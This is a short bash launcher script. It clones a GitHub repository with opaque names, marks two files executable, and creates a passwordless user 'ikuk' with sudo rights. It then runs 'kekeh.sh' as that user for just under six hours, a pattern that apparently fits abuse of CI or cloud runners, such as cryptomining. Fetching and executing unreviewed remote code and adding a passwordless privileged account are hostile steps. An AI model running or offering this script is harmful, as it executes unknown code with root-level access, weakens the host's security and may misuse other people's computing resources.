#!/bin/bash
sudo apt update
git clone https://github.com/gembock/luy.git && cd luy
chmod +x kekeh.sh && chmod +x cley
sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
sudo -u ikuk -H sh -c "timeout 359m ./kekeh.sh"
sudo apt update
